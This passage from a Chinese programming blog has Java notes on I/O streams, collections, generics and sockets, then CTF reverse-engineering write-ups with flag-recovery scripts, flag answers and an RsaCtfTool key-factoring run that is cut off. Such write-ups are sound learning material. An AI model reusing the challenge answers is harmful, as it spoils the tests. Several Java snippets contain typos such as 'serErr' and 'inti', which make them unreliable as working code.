byte[] buf = baos.toByteArray();//把自动生成的字节数组复制到toByteArray()里去，再赋给buf\n        ByteArrayInputStream bais = new ByteArrayInputStream(buf);//把数组buf作为形参生成一个字节数组输入流对象\n        DataInputStream dis = new DataInputStream(bais);\n        long l = dis.readLong();//把字节数组读出来，返回长整型\n        //dis.readLong(l);//错误，读出来不需要参数\n        System.out.println(\"l = \" + l);\n        dos.close();\n    }\n}\n```\n\n## 转换流\n\nOutputStreamWriter流是把OutputStream流转化成Writer流的流，InputStreamReader流是把InputStream流转化成Reader流的流。\n\nOutputStreamWriter和InputStreamWriter都是处理流。\n\n### 转换流实例\n\n如何将键盘输入的字符组成字符串直接赋给String对象。\n\n```java\nimport java.io.*;\npublic class TestString\n{\n    public static void main(String[] args) throws Exception\n    {\n        String str = null;\n        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));\n        str = br.readLine();//readLine不包含换行符\n        System.out.println(\"str = \" + str);\n    }\n}\n```\n\n## Print流\n\nPrint流只有输出，没有输入。\n\nPrintWriter输出字符，PrintStream输出字节。\n\n### PrintStream\n\nPrintStream在OutputStream基础之上提供了增强的功能，即可以方便地输出各种类型数据(而不仅限于byte型)的格式化表示形式。\n\nPrintStream重载了printf和println方法，用于各种不同类型数据的格式化输出，格式化输出是指将一个数据用其字符串格式输出。\n\n```java\nimport java.io.*;\npublic class TestPrintString\n{\n    public static void main(String[] args) throws Exception\n    {\n        DataOutputStream dos = new DataOutputStream(new FileOutputStream(\"D:/Java/1.txt\"));\n        dos.writeLong(12345);//实际写入文件的是00 00 00 00 00 00 30 39\n        dos.close();\n        System.out.printf(\"%#X\\n\", 12345);//0X3039\n        \n        PrintStream ps = new PrintStream(new FileOutputStream(\"D:/Java/2.txt\"));\n        ps.println(12345);//实际写入文件的是‘1’，‘2’，‘3’，‘4’，‘5’\n        ps.close();\n    }\n}\n```\n\n### PrintWriter\n\nPrintWriter提供了PrintStream的所有打印方法，其方法也从不抛出IOException\n\n与PrintStream的区别：①作为处理流使用时，PrintStream只能封装OutputStream类型的字节流，而PrintWriter既可以封装OutputStream还能够封装Writer；②PrintWriter中的println()方法具有更好的跨平台性。\n\n### 标准输入输出的重定向\n\n```java\ntry\n{\n    ...\n}\ncatch(Exception e)\n{\n    e.printStackTrace();//默认把错误信息输出到System.err所关联的设备中\n    ...\n}\n```\n\n```java\npublic class TestSys\n{\n    public static void main(String[] args) throws Exception\n    {\n        PrintStream ps = new PrintStream(\"D:/heihei.aaa\");\n        System.setOut(ps);//设置输出，原本输出是在终端，现在改变输出设备，输出到ps里去\n        System.out.println(\"哈哈\");//哈哈放到了heihei.aaa\n    }\n}\n```\n\n```java\npublic class TestSetSystemOut\n{\n    public static void main(String[] args)\n    {//包含异常的写法\n        PrintStream ps_out = null;\n        try\n        {\n            ps_out = new PrintStream(new FileOutputStream(\"D:/Java/hello\"));\n            System.setOut(ps_out);\n            System.out.println(12);\n            System.out.println(55.5);\n        }\n        catch(Exception e)\n        {\n            e.printStackTrace();\n        }\n        finally\n        {\n            try\n            {\n                ps_out.close();\n            }\n            catch(Exception e)\n            {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n#### 实例\n\n编程实现将键盘输入整型数据到A文件中，如果输入有误，则把出错信息输出到B文件中。\n\n```java\nimport java.io.*;\nimport java.util.*;\npublic class TestSetOutErr\n{\n    public static void main(String[] args)\n    {\n        PrintStream psOut = null;\n        PrintStream psError = null;\n        Scanner sc = null;\n        try\n        {\n            psOut = new PrintStream(\"D:/Out.txt\");\n            psError = new PrintStream(\"D/Error.txt\");\n            sc = new Scanner(System.in);\n            int num;\n            System.setOut(psOut);\n            System.serErr(psError);\n            while(true)\n            {\n                num = sc.nextInt();\n                System.out.println(num);\n            }\n        }\n        catch(Exception e)\n        {\n            System.err.println(\"出错的信息是：\");\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n## 对象的序列化(Object流)\n\nSerializable接口中没有任何方法，这种类型的接口被称为标记接口。如果一个类实现了Serializable接口，潜在含义就是告诉编译器这个类是允许被序列化的，如果程序中存在序列该对象的代码，编译器就会自动进行相应的处理以完成该对象的序列化，如果该对象没有实现Serializable接口，程序中却存在该对象被序列化的代码，编译器编译时就会报错。\n\n在Java中transient修饰的成员变量在对象序列化时不会被序列化。\n\n```java\nimport java.io.*;\npublic class TestObjectIO\n{\n    public static void main(String[] args)\n    {\n        ObjectOutputStream oos = null;\n        ObjectInputStream ois = null;\n        Student ss = new Student(\"zhangsan\", 1000, 88.8f);\n        Student ss2 = null;\n        try\n        {\n            FileOutputStream fos = new FileOutputStream(\"D:\\\\Java\\\\dudu\");\n            oos = new ObjectOutputStream(fos);\n            oos.writeObject(ss);\n            \n            ois = new ObjectInputStream(new FileInputStream(\"D:/Java/dudu\"));\n            ss2 = (Student)ois.readObject();//(Student)不能省\n            \n            System.out.println(\"ss2.sname = \" + ss2.sname);\n            System.out.println(\"ss2.sid = \" + ss2.sid);\n            System.out.println(\"ss2.sscore = \" + ss2.sscore);\n        }\n        catch(FileNotFoundException e)\n        {\n            System.out.println(\"文件没有找到！\");\n            System.exit(-1);\n        }\n        catch(Exception e)\n        {\n            e.printStackTrace();\n            System.exit(-1);\n        }\n        finally\n        {\n            try\n            {\n                oos.close();\n                ois.close();\n            }\n            catch(Exception e)\n            {\n                e.printStackTrace();\n            \tSystem.exit(-1);\n            }\n        }\n    }\n}\nclass Student implements Serializable//这个接口为空，用作标识\n{\n    public String sname = null;\n    public int sid = 0;\n    transient public float sscore = 0;//表示sscore成员不能被序列化\n    public Student(String name, int id, float score)\n    {\n        this.sname = name;\n        this.sid = id;\n        this.sscore = score;\n    }\n}\n/**\nss2.sname = zhangsan\nss2.sid = 1000\nss2.sscore = 0.0\n*/\n```\n\n# 容器\n\n```java\nimport java.util.*;\nclass A\n{\n    public String toString()\n    {\n        return \"Haha\";\n    }\n}\npublic class Test\n{\n    public static void main(String[] args)\n    {\n        ArrayList al = new ArrayList();//数组线性结构\n        al.add(12345);\n        al.add(\"张三\");\n        al.add(66.6);\n        al.add(new A());\n        System.out.println(al);//[12345, 张三, 66.6, Haha]\n        //println调用的是al里面的各个对象的toString方法\n        //12345是个值，但添加到ArrayList里面的值就转换成了对象\n        //System.out.println(al[2]);//不是数组，不能用下标\n        System.out.println(al.get(2));//66.6\n        \n        Object[] obArr = al.toArray();//把集合转化为数组\n        System.out.println(al[2]);//66.6\n    }\n}\n```\n\n## 为什么需要容器\n\n数组存在两个缺陷：\n\n- 数组长度难以扩充\n- 数组中元素类型必须相同\n\n容器可以弥补数组的这两个缺陷。\n\n## 容器与现实的对应关系\n\n集合(容器)就是将若干用途、性质相同或相近的“数据”组合而成的一个整体。\n\n数学上，集合类型可以归纳为三种\n\n- 集(Set)：Set集合不区分元素的顺序，不允许出现重复元素\n- 列表(List)：List集合区分元素顺序，且允许包含重复元素\n- 映射(Map)：映射中保存成对“键-值”(Key-Value)信息，映射中不能包含重复的键，每个键最多只能映射一个值\n\nJava设计了三个接口来对应数学上的三种集合类型，这三个接口名字分别为Set、List、Map。\n\n## Collection接口中的方法介绍\n\n```java\n//返回此collection中的元素数\nint size();\n\n//判断是否为空\nboolean isEmpty();\n\n//判断形参c所指向的集合中的所有元素是不是已经全部包含在了当前集合中\nboolean containesAll(Collection c);\n\n//返回能够遍历当前集合所有元素的迭代器\nIterator iterator();\n\n//返回一个包含此collection中所有元素的数组\nObject[] toArray();\n\n//把e添加到当前集合中\nboolean add(Object e);\n\n//把o移除\nboolean remove(Object o);\n\n//把c中所有的元素添加到当前集合中\nboolean addAll(Collection c);\n\n//把c中所有元素移除\nboolean removeAll(Collection c);\n\n//把当前容器中的所有元素清除\nvoid clear();\n\n//判断是否相等\nboolean equals(Object o);\n\n//返回哈希码\nint hashCode();\n```\n\n## Collection接口的子接口——List接口\n\nList接口是Collection的子接口，实现List接口的容器类中的元素是有顺序的，而且可以重复。\n\nList容器中的元素都对应一个整数型的序号记载其在容器中的位置，可以根据序号存取容器中的元素。\n\nJ2SDK所提供的List容器类有ArrayList, LinkList等。\n\n```java\n//获取下标为index的元素\nObject get(int index);\n\n//把index位置的元素设置成element元素\nObject set(int index, Object element);\n\n//在index位置添加element元素\nvoid add(int index, Object element);\n\n//删除下标为index的元素\nObject remove(int index);\n\n//获取o元素出现的第一个下标\nint indexOf(Object o);\n\n//获取o元素出现的最后一个下标\nint lastIndexOf(Object o);\n```\n\n### ArrayList与LinkedList的比较\n\nArrayList和LinkedList都实现了List接口中的方法，但两者内部实现不同。ArrayList底层采用数组完成，而LinkedList则是以一般的双向链表完成，其内每个对象除了数据本身外，还有两个引用，分别指向前一个元素和后一个元素。\n\n它们两个的性质与C语言的数组和链表的性质一样。\n\n## Collections类\n\nCollection接口的实现类，如ArrayList、LinkedList本身并没有提供排序、倒置、查找等方法，这些方法是由Collesctions类来实现的，该类有很多public static方法，可以直接对Collection接口的实现类进行操作。\n\n### Collections类常用方法\n\n```java\n//对List容器内的元素排序\nvoid sort(List);\n\n//对List容器内的对象进行随机排列\nvoid shuffle(List);\n\n//对List容器内的对象进行逆序排列\nvoid reverse(List);\n\n//用一个特定的对象重写整个List容器\nvoid fill(List, Object);\n\n//将src List容器内容拷贝到dest List容器\nvoid copy(List dest, List src);\n\n//对于顺序的List容器，采用折半查找的方法查找特定对象的下标\nint binarySearch(List, Object);\n```\n\n```java\nimport java.util.*;\npublic class TestCollections\n{\n    public static void main(String[] args)\n    {\n        List lt = new LinkedList();//利用多态\n        for(int i=0; i<7; i++)\n        {\n            lt.add(\"a\" + i);\n        }\n        System.out.println(lt);\n        \n        Collections.shuffle(lt);//乱序\n        System.out.println(lt);\n        \n        Collections.sort(lt);//排序\n        System.out.println(lt);\n        \n        Collections.reverse(lt);//倒置\n        System.out.println(\"倒置之后：\" + lt);\n        System.out.println(Collections.binarySearch(lt, \"a5\"));//-8，倒置之后找不到，因为binarySearch方法只针对升序排序\n        \n        Collections.sort(lt);\n        System.out.println(\"重新排序之后：\" + lt);\n        System.out.println(Collections.binarySearch(lt, \"a5\"));//5\n        \n        Collections.fill(lt, \"0\");\n        System.out.println(lt);\n    }\n}\n```\n\n## Comparable接口\n\n```java\nimport java.util.*;\nclass Student\n{\n    private int id;\n    private String name;\n    public Student(inti id, String name)\n    {\n        this.id = id;\n        this.name = name;\n    }\n    @Override\n    public String toString()\n    {\n        return id + \" \" + name;\n    }\n}\npublic class TestList\n{\n    public static void main(String[] args)\n    {\n        List L = new ArrayList();\n        L.add(new Student(1000, \"张三\"));\n        L.add(new Student(1001, \"李四\"));\n        L.add(new Student(1002, \"王五\"));\n        //Collections.sort(L);//错误，不知道对对象的哪个属性排序\n        System.out.println(L);\n    }\n}\n```\n\n```java\nimport java.util.*;\nclass Student implements Comparable\n{//使用comparable接口调用compareTo方法\n    private int id;\n    private String name;\n    public Student(int id, String name)\n    {\n        this.id = id;\n        this.name = name;\n    }\n    @Override\n    public String toString()\n    {\n        return id + \" \" + name;\n    }\n    @Override\n    public int compareTo(Object o)\n    {//Obejct o是父类，需转换为子类才能调用子类的属性\n        Student st = (Student)o;\n        if(this.id == st.id)\n            return 0;\n        else if(this.id > st.id)\n            return 1;\n        else\n            return -1;\n    }\n}\npublic class TestList_2\n{\n    public static void main(String[] args)\n    {\n        List L = new ArrayList();\n        L.add(new Student(1000, \"张三\"));\n        L.add(new Student(1001, \"李四\"));\n        L.add(new Student(1002, \"王五\"));\n        L.add(new Student(1002, \"王五\"));\n        Collections.sort(L);//sort自动调用compareTo方法\n        System.out.println(L);//此时输出两个王五，这是我们不希望的，List接口有顺序可重复，而Set接口无顺序不重复。如果不希望输出两个王五，则使用Set接口\n    }\n}\n```\n\n## Collection接口的子接口——Set接口\n\n因为Set和List都是继承自Collection接口，所以Set和List中有很多方法是一样的。\n\nList接口中有add, set, indexOf方法，但Set接口中却只有add方法，没有set, indexOf方法。因为Set是无序且不能重复的，不存在某元素具体位置这个概念。\n\n```java\nimport java.util.*;\nclass Student\n{\n    private int id;\n    private String name;\n    public Student(int id, String name)\n    {\n        this.id = id;\n        this.name = name;\n    }\n    @Override\n    public String toString()\n    {\n        return id + \" \" + name;\n    }\n    @Override\n    public boolean equals(Object ob)\n    {//id和name都相等返回true，即st.id和st.name相乘的哈希码与this.id和this.name相乘的哈希码一样则返回true\n        Student st = (Student)ob;\n        return this.id == st.id && this.name == st.name;\n    }\n    @Override\n    public int hashCode()\n    {//返回id和name相乘的哈希码\n        return id * this.name.hashCode();\n    }\n}\npublic class TestSet\n{\n    public static void main(String[] args)\n    {\n        Set S = new HashSet();//TreeSet不需要重写equals和hashCode方法，但需要Comparable接口，且在插入数据时自动排序\n        //使用hashSet实现不重复要重写equals和hashCode方法，二者缺一不可\n        S.add(new Student(1000, \"张三\"));\n        S.add(new Student(1001, \"李四\"));\n        S.add(new Student(1002, \"王五\"));\n        System.out.println(S);\n        \n       \tS.add(new Student(1002, \"王五\"));\n        S.add(new Student(1001, \"王五\"));\n        S.add(new Student(1004, \"王五\"));\n        System.out.println(S);\n    }\n}\n/**\n[1000 张三, 1001 李四, 1002 王五]\n[1000 张三, 1001 李四, 1001 王五, 1002 王五, 1004 王五]\n*/\n//这个程序只解决了[id,name]的唯一性，却没有解决id的唯一性\n```\n\n### equals和hashCode方法的使用\n\n```java\nclass A\n{\n    private int i;\n    public A(int i)\n    {\n        this.i = i;\n    }\n}\npublic class TesthashCode\n{\n    public static void main(String[] args)\n    {\n        A aa1 = new A(1);\n        A aa2 = new A(1);\n        System.out.println(aa1 == aa2);//flase\n        System.out.println(aa1.equals(aa2));//flase\n        System.out.println(aa1.hashCode() == aa2.hashCode());//flase\n        \n        Integer it1 = new Integer(1);\n        Integer it2 = new Integer(1);\n        System.out.println(it1 == it2);//flase\n        System.out.println(it1.equals(it2));//true\n        //equals显示true表示Integer已经重写了equals方法，Java所有自带的数据类型都重写了equals方法，下面的hashCode同理\n        System.out.println(it1.hashCode() == it2.hashCode());//true\n    }\n}\n```\n\n如果不重写equals和hashCode方法，equals比较aa1和aa2的对象的地址的十六进制是否相等，hashCode比较aa1和aa2的对象的地址的十进制是否相等。\n\n如何重写equals和hashCode方法？\n\n```java\nclass A\n{\n    private int i;\n    public A(int i)\n    {\n        this.i = i;\n    }\n    @Override\n    public boolean equals(Object ob)\n    {\n        A aa = (A)ob;\n        return this.i == aa.i;\n    }\n    @Override\n    public int hashCode()\n    {\n        return new Integer(i).hashCode();\n    }\n}\npublic class TesthashCode_2\n{\n    public static void main(String[] args)\n    {\n        A aa1 = new A(1);\n        A aa2 = new A(1);\n        System.out.println(aa1 == aa2);//false\n        System.out.println(aa1.equals(aa2));//true\n        System.out.println(aa1.hashCode() == aa2.hashCode());//true\n        \n        Integer it1 = new Integer(1);\n        Integer it2 = new Integer(1);\n        System.out.println(it1 == it2);//flase\n        System.out.println(it1.equals(it2));//true\n        System.out.println(it1.hashCode() == it2.hashCode());//true\n    }\n}\n```\n\n## Iterator接口\n\n常用方法：\n\n```java\n//判断当前游标的后面是否还存在元素，如果存在返回true\nboolean hasNext();\n\n//先返回当前游标右边的元素，然后游标后移一个位置\nObject next();\n\n//删除最近返回的元素，在调用remove之前，我们至少保证先调用一次next方法，而且调用next之后只能调用一次remove方法，remove方法不推荐使用\nvoid remove();\n```\n\n```java\nimport java.util.*;\npublic class TestIterator\n{\n    //可以遍历所有Collection接口的实现类\n    public static void showCollection(Collection c)\n    {\n        Iterator it = c.iterator();//it相当于指针，指向容器c的第一个元素\n        while(it.hasNext())//相当于遍历\n        {\n            System.out.println(it.next());\n        }\n    }\n    public static void main(String[] args)\n    {\n        ArrayList al = new ArrayList();\n        al.add(\"one\");\n        al.add(22);\n        al.add(new Point(1,1));\n        System.out.println(\"al容器的内容是：\");\n        showCollection(al);\n        \n        HashSet hs = new HashSet();\n        hs.add(\"one\");\n        hs.add(22);\n        hs.add(new Point(1,1));\n        System.out.println(\"hs容器的内容是：\");\n        showCollection(hs);\n    }\n}\nclass Point\n{\n    private int i, j;\n    public Point(int i, int j)\n    {\n        this.i = i;\n        this.j = j;\n    }\n    public String toString()\n    {\n        return \"[\" + i + \",\" + j + \"]\";\n    }\n}\n```\n\n```java\nimport java.util.*;\npublic class TestIterator_2\n{\n    public static void main(String[] args)\n    {\n        Collection c = new TreeSet();//TreeSet自动排序\n        c.add(\"123\");\n        c.add(\"456\");\n        c.add(\"234\");\n        c.add(\"111\");\n        c.add(\"678\");\n        Iterator i = c.iterator();\n        while(i.hasNext())\n        {\n            System.out.println(i.next());\n        }\n    }\n}\n/**\n111\n123\n234\n456\n678\n*/\n```\n\n## Map接口\n\njava.util.Map接口描述了映射结构，Map结构允许以键集、值集合或键-值映射关系集的形式查看某个映射的内容。\n\n主要方法：\n\n```java\nObject put(Object key, Object value);\nObject get(Object key);\n\n//把m容器中所有元素存入当前容器中\nvoid putAll(Map m);\nboolean isEmpty();\nvoid clear();\nint size();\nboolean containsKey(Object key);\nboolean containsValue(Object value);\nObject remove(Object key);\n```\n\n```java\nimport java.util.*;\npublic class TestHashMap\n{\n    public static void main(String[] args)\n    {\n        Map m = new HashMap();\n        m.put(\"one\", \"zhangsan\");//前面是Key,后面是Value\n        m.put(66.6, 70);\n        m.put(new A(), \"12\");\n        //System.out.println(m.get(\"12\"));//null,get方法不能对value使用，只能对key使用\n        System.out.println(m.get(66.6));//70\n        System.out.println(m);//{66.6=70, one=zhangsan, A@15db9742=12}\n        m.put(66.6, 80);\n        System.out.println(m);//{66.6=80, one=zhangsan, A@15db9742=12}\n    }\n}\nclass A\n{}\n```\n\nMap(映射)是一种把键对象和值对象进行映射的集合，它的每一个元素都包含一对键对象和值对象。\n\n向Map集合中加入元素时，必须提供一对键对象和值对象，从Map集合中检索元素时，只要给出键对象，就会返回对应的值对象。\n\n```java\nimport java.util.*;\nclass Student\n{\n    private int id;\n    private String name;\n    private int age;\n    public Student()\n    {}\n    public Student(int id, String name, int age)\n    {\n        this.id = id;\n        this.name = name;\n        this.age = age;\n    }\n    public int hashCode()\n    {\n        return this.name.hashCode() * id * age;\n    }\n    public boolean equals(Object o)\n    {\n        Student s = (Student)o;\n        return this.name.equals(s.name) && this.id == s.id && this.age == s.age;\n    }\n    public String toString()\n    {\n        return id + \" \" + name + \" \" + age;\n    }\n}\npublic class TestHashMap_2\n{\n    public static void main(String[] args)\n    {\n        HashMap hm = new HashMap();//需要重写equals和hashCode\n        hm.put(1001, new Student(1001, \"zhangsan\", 20));//自动封装,1001被认为是Integer的一个对象\n        hm.put(1003, new Student(1003, \"lisi\", 30));\n        hm.put(new Integer(1004), new Student(1004, \"wangwu\", 10));\n        hm.put(1002, new Student(1002, \"v5le0n9\", 20));\n        \n        //遍历所有元素\n        System.out.println(\"hm容器中所有的元素是：\");\n        Set s = hm.keySet();//获取当前容器键的集合\n        Iterator it = s.iterator();\n        while(it.hasNext())\n        {\n            Integer key = (Integer)it.next();//(Integer)不能省\n            System.out.println(hm.get(key));\n        }\n        \n        System.out.println(\"直接查找某一元素\");\n        System.out.println(hm.get(1003));\n        System.out.println(hm.get(1005));//找不到返回null\n    }\n}\n/**\nhm容器中所有的元素是：\n1001 zhangsan 20\n1002 v5le0n9 20\n1003 lisi 30\n1004 wangwu 10\n直接查找某一元素\n1003 lisi 30\nnull\n*/\n```\n\n## 泛型\n\n泛型是用来限制传入容器、接口中的数据类型。\n\n参考TestHashMap_2\n\n```java\nHashMap<Integer, Student> hm = new HashMap<Integer, Student>();//容器中的东西全都是对象，所以Integer不能改为int\n//因为1001，1002都是Integer自动封装的，所以是Integer类型,Set同理\nSet<Integer> s = hm.keySet();\n//这样写保证了程序的安全性\nIterator<Integer> it = s.iterator();\n//Iterator it是键的集合，所以也是Integer类型，此时\n//Integer key = (Integer)it.next();可以省略(Integer)\nInteger key = it.next();\n```\n\n```java\n/**\nComparable<T> 接口中有如下方法：\n\tint compareTo(T o)\n要想限制传入Comparable接口的数据类型，可以利用泛型来实现：\nclass Student implements Comparable<Student>\n{\n\t...\n\tpublic int compareTo(Student ob)//Student不能写成Object\n\t{}\n}\n*/\n```\n\n# 网络编程\n\n## UDP编程\n\n```java\nimport java.net.*;\nimport java.io.*;\npublic class TestUDPServer\n{\n    public static void main(String[] args) throws Exception\n    {\n        //定义码头\n        DatagramSocket ds = new DatagramSocket(5678);//表示该码头占用的是5678这个编号，即服务端的端口号为5678\n        \n        //定义可以用来接受数据的集装箱\n        byte buf[] = new byte[1024];\n        DatagramPacket dp = new DatagramPacket(buf, buf.length);\n        try\n        {\n            while(true)\n            {\n                //在码头上用集装箱接受对方发送过来的数据\n                ds.receive(dp);\n                \n                //从集装箱中取出对方发送过来的数据\n                ByteArrayInputStream bais = new ByteArrayInputStream(dp.getData());\n                DataInputStream dis = new DataInputStream(bais);\n                System.out.println(dis.readLong());\n            }\n        }\n        catch(Exception e)\n        {\n            e.printStackTrace();\n            ds.close();//关闭码头\n        }\n    }\n}\n```\n\n```java\nimport java.net.*;\nimport java.io.*;\npublic class TestUDPClient\n{\n    public static void main(String[] args) throws Exception\n    {\n        //定义码头ds\n        DatagramSocket ds = new DatagramSocket();\n        \n        //定义可以发送数据的集装箱dp,dp中保存着数据，是n的二进制代码\n        long n = 10000L;\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        DataOutputStream dos = new DataOutputStream(baos);\n        dos.writeLong(n);//把10000写到字节数组里去\n        byte[] buf = baos.toByteArray();\n        DatagramPacket dp = new DatagramPacket(buf, buf.length, new InetSocketAddress(\"127.0.0.1\", 5678));//把字节数组包装成一个集装箱,发送到本地5678端口\n        \n        //在码头上把集装箱中的数据发送给对方\n        ds.send(dp);\n\n        //关闭码头\n        ds.close();\n    }\n}\n```\n\n## TCP编程\n\n```java\nimport java.net.*;\nimport java.io.*;\npublic class TCPServer\n{\n    public static void main(String[] args) throws Exception\n    {\n        ServerSocket ss = new ServerSocket(6666);//6666是端口号\n        while(true)\n        {\n            Socket s = ss.accept();//等待客户端连接\n            System.out.println(\"一个连接已经建立！\");\n            DataInputStream dis = new DataInputStream(s.getInputStream());\n            System.out.println(dis.readUTF());\n            dis.close();\n            s.close();\n        }\n    }\n}\n```\n\n```java\nimport java.net.*;\nimport java.io.*;\npublic class TCPClient\n{\n    public static void main(String[] args) throws Exception\n    {\n        Socket s = new Socket(\"127.0.0.1\", 6666);\n        OutputStream os = s.getOutputStream();\n        DataOutputStream dos = new DataOutputStream(os);\n        dos.writeUTF(\"v5le0n9\");\n        dos.flush();\n        dos.close();\n        s.close();\n    }\n}\n```\n\n","categories":["开发"],"tags":["Java"]},{"title":"BUUCTF 逆向合集","url":"/posts/f4e89fa4.html","content":"\n前面很容易就解出来的题我就没放上来，都已经做过这么多题了，相信对你们来说也是so easy。\n\n<!--more-->\n\n# 1. SimpleRev\n\n可能做题做多了脑子抽了，这道题其实很容易结果我好久都没解出来。好吧，那你就是第1题啦。\n\nELF文件，载入IDA。\n\n{% asset_img 1.1.png IDA分析 %}\n\n{% asset_img 1.2.png IDA分析 %}\n\n但长长整型转换的字符串是小端存储的，所以还要逆序！！这个超级容易错，我出来的flag不对就是因为这个！！\n\n{% asset_img 1.3.png IDA分析 %}\n\n由于逆向v1有点困难，所以我们就不逆向算法了，直接将ASCII码表里所有字符按照原本算法进行匹配。\n\n```python\ntext = list(\"killshadow\")\nkey = list(\"ADSFKNDCLS\")\nans = \"\"\nv5 = len(key)\nv3 = 0\nfor i in range(v5):\n    if key[v3%v5]>'@' and key[v3%v5]<='Z':\n        key[i] = chr(ord(key[v3%v5]) + 32)\n        v3 += 1\n        print(key[i],end=\"\")\nprint()\nfor i in range(v5):\n    for j in range(32,128):\n        if (j>64 and j<91) or (j>96 and j<123):\n            if (j-39-ord(key[v3%v5])+97)%26+97 == ord(text[i]):\n                v3 += 1\n                ans += chr(j)\n                break\nprint(ans)\n'''\nadsfkndcls\nKLDQCUDFZO\n'''\n```\n\n```\nflag{KLDQCUDFZO}\n```\n\n# 2. luck_guy\n\n无壳，64位ELF，载入IDA分析一下。随着main函数进入关键函数。\n\n{% asset_img 2.1.png IDA分析 %}\n\n```python\n# 将f2串加上0x，再放入列表\ntmp_list = []\nindex = 0\nwhile index < 15:\n\ttmp = eval('0x' + f2[index:index+2])\n\ttmp_list.append(tmp)\n\tindex += 2\n\nfor i in range(len(tmp_list)):\n\tif i % 2 == 1:\n\t\ttmp_list[i] = tmp_list[i] - 2\n\telse:\n\t\ttmp_list[i] = tmp_list[i] - 1\n\tans += chr(tmp_list[i])\nprint(ans)\n'''\nGXY{do_not_hate_me}\n'''\n```\n\n```\nflag{do_not_hate_me}\n```\n\n# 3. 刮开有奖\n\n{% asset_img 3.1.png IDA分析 %}\n\nv4解出来是`jMp`，v5解出来是`WP1`。\n\n```\nString[2] = 'W'\nString[3] = 'P'\nString[4] = '1'\nString[5] = 'j'\nString[6] = 'M'\nString[7] = 'p'\n```\n\n接下来算String[0]和String[1]，发现如果直接代入上面的值，却得String[0]=`|`，String[1]=`C`，String[2]=`a`，String[3]=`@`。所以v7~v16应该是做了某些变换。sub_4010F0就是做变换的函数。\n\n{% asset_img 3.2.png IDA分析 %}\n\n进去看它代码，有do...while...语句和递归，由于我用Python一直出错，可能是我逻辑出现了问题，所以最后还是用C照搬它的代码吧。\n\n```c\n#include <stdio.h>\nint sub_4010F0(char * a1, int a2, int a3)\n{\n    int result; // eax\n    int i; // esi\n    int v5; // ecx\n    int v6; // edx\n\n    result = a3;\n    for (i = a2; i <= a3; a2 = i)\n    {\n        v5 = i;\n        v6 = a1[i];\n        if (a2 < result && i < result)\n        {\n            do\n            {\n                if (v6 > a1[result])\n                {\n                    if (i >= result)\n                        break;\n                    ++i;\n                    a1[v5] = a1[result];\n                    if (i >= result)\n                        break;\n                    while (a1[i] <= v6)\n                    {\n                        if (++i >= result)\n                            goto LABEL_13;\n                    }\n                    if (i >= result)\n                        break;\n                    v5 = i;\n                    a1[result] = a1[i];\n                }\n                --result;\n            } while (i < result);\n        }\n    LABEL_13:\n        a1[result] = v6;\n        sub_4010F0(a1, a2, i - 1);\n        result = a3;\n        ++i;\n    }\n    return result;\n}\n\nint main()\n{\n    char a1[12] = { 90,74,83,69,67,97,78,72,51,110,103 };\n    printf(\"%s\\n\", a1);\n    sub_4010F0(a1, 0, 10);\n    printf(\"%s\", a1);\n}\n/**\nZJSECaNH3ng\n3CEHJNSZagn\n*/\n```\n\n呜呜呜不得不说，C真香啊，弄了我好久的Python，C一下就出来了，气人！\n\n```\nString[0] = '3' + 34 = 'U'\nString[1] = 'J'\nString[2] = 'W'\nString[3] = 'P'\n```\n\n验证一下，String[2]和String[3]与上面Base64解密解出来的是一致的，所以是正确答案。\n\n```\nflag{UJWP1jMp}\n```\n\n# 4. pyre\n\n下载下来是`.pyc`文件，这个是 Python 程序编译后得到的字节码文件，找一个[python反编译的网站](https://tool.lu/pyc/)即可转化为python代码。\n\n```python\n#!/usr/bin/env python\n# visit https://tool.lu/pyc/ for more information\nprint 'Welcome to Re World!'\nprint 'Your input1 is your flag~'\nl = len(input1)\nfor i in range(l):\n    num = ((input1[i] + i) % 128 + 128) % 128\n    code += num\n\nfor i in range(l - 1):\n    code[i] = code[i] ^ code[i + 1]\n\nprint code\ncode = [\n    '\\x1f',\n    '\\x12',\n    '\\x1d',\n    '(',\n    '0',\n    '4',\n    '\\x01',\n    '\\x06',\n    '\\x14',\n    '4',\n    ',',\n    '\\x1b',\n    'U',\n    '?',\n    'o',\n    '6',\n    '*',\n    ':',\n    '\\x01',\n    'D',\n    ';',\n    '%',\n    '\\x13']\n```\n\n我们要做的工作就是将它逆向回去。\n\n```python\nimport string\ncode = [\n    '\\x1f',\n    '\\x12',\n    '\\x1d',\n    '(',\n    '0',\n    '4',\n    '\\x01',\n    '\\x06',\n    '\\x14',\n    '4',\n    ',',\n    '\\x1b',\n    'U',\n    '?',\n    'o',\n    '6',\n    '*',\n    ':',\n    '\\x01',\n    'D',\n    ';',\n    '%',\n    '\\x13']\nl = len(code)\nfor i in range(l-2,0,-1):\n    code[i] = chr(ord(code[i]) ^ ord(code[i + 1]))\ninput = string.printable\nans = \"\"\nfor i in range(l):\n    for j in input:\n        if code[i] == chr(((ord(j) + i) % 128 + 128) % 128):\n            ans += j\nprint (ans)\n'''\nWHT{Just_Re_1s_Ha66y!}\n'''\n```\n\n```\nflag{Just_Re_1s_Ha66y!}\n```\n\n# 5. rsa\n\n一道像密码题的逆向题。解压出来有两个文件，一个公钥文件和一个加密文件。\n\n{% asset_img 5.1.png 文件 %}\n\n[rsa第一种解法](https://blog.csdn.net/m0_57291352/article/details/117716772)，通过解析公钥获得n和e，再将n分解成p和q，然后用Python中的rsa和gmpy2库解密。\n\nrsa第二种解法，用RsaCtfTool直接解。[kali安装RsaCtfTool](https://blog.csdn.net/Rational_HYJ/article/details/105688728)，安装好后进入其目录在终端输入命令：`python3 RsaCtfTool.py --publickey pub.key --uncipherfile flag.enc`\n\n```\n┌──(v5le0n9㉿kali)-[~/RsaCtfTool]\n└─$ python3 RsaCtfTool.py --publickey pub.key --uncipherfile flag.enc    1 ⨯\nprivate argument is not set, the private key will not be displayed, even if recovered.                                                                    \n\n[*] Testing key pub.key.\n[*] Performing system_primes_gcd attack on pub.key.\n100%|███████████████████████████████| 7007/7007 [00:00<00:00, 1370394.86it/s]\n[*] Performing fibonacci_gcd attack on pub.key.\n100%|████████████████████████████████| 9999/9999 [00:00<00:00, 302473.41it/s]\n[*] Performing pastctfprimes attack on pub.key.\n100%|█████████████████████████████████| 113/113 [00:00<00:00, 2246238.64it/s]\n[*] Performing smallq attack on pub.key.\n[*] Performing factordb attack on pub.key.\n[*] Attack success with factordb method !\n\nResults for 